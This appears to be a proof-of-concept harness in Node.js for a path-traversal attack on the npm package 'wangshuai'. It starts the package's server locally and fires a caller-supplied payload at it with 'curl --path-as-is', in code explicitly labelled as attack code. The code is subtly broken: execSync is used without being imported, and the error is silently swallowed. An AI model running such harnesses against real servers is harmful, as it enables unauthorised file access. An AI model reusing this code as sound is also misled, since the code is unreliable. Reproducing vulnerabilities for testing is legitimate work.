function exploitFunction(payload) {
  const { exec } = require("child_process");
  const sleep = require("sleep");
  const path = require("path");

  // Clean up any existing server on port 8888
  try {
    execSync("fuser -k 8888/tcp");
  } catch (e) {}

  // Start the server
  let server = "node ./node_modules/wangshuai/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  // Craft the attack string
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;

  // Execute the attack string
  exec(attack_string, (error, stdout) => {
    if (error) {
      console.error(`Error executing attack: ${error}`);
    } else {
      console.log(`Output: ${stdout}`);
    }
  });
}

module.exports = { exploitFunction };